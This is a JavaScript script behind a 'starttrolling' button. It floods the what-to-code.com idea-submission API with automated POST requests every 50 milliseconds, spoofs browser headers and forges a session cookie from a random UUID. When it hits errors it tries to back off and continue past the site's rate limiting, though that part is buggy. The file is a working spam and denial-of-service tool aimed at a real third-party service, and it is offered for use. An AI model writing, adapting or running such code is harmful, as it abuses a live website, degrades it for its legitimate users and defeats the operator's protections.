const sqs = qs => document.querySelector(qs);

let del = 50, vw = null, i = 0, rl = 1;

function generateUUID() { // Public Domain/MIT
    var d = new Date().getTime();//Timestamp
    var d2 = ((typeof performance !== 'undefined') && performance.now && (performance.now()*1000)) || 0;//Time in microseconds since page-load or 0 if unsupported
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16;//random number between 0 and 16
        if(d > 0){//Use timestamp until depleted
            r = (d + r)%16 | 0;
            d = Math.floor(d/16);
        } else {//Use microseconds since page-load if supported
            r = (d2 + r)%16 | 0;
            d2 = Math.floor(d2/16);
        }
        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
}

const fun = function () {
  fetch("https://what-to-code.com/api/ideas", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "no-cache",
      "content-type": "application/json;charset=UTF-8",
      "pragma": "no-cache",
      "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
      "accept": "application/json, text/plain, */*",
      "accept-encoding": "gzip, deflate, br",
      "dnt": "1",
      "cookie": "token="+generateUUID()+";"
    },
    "referrer": "https://what-to-code.com/submit",
    "referrerPolicy": "no-referrer-when-downgrade",
    "body": "{\"title\":\""+sqs('#name').value+"\",\"description\":\""+sqs('#description').value+"\",\"tags\":[]}",
    "method": "POST",
    "mode": "no-cors",
    "credentials": "include",
  }).then(function (data) {
    i++;
    sqs('#stat').textContent = 'Currently sent ' + String(i) + ' requests.';
  }).catch(function (error) {
    sqs('#stat').textContent = 'Currently ratelimited. Bumping up execution time...';
    rl++;
    clearInterval(vw);
    setInterval(vw, del * rl)
  });
};

sqs('#starttrolling').addEventListener('click', function () {
  vw = setInterval(fun, del);
});
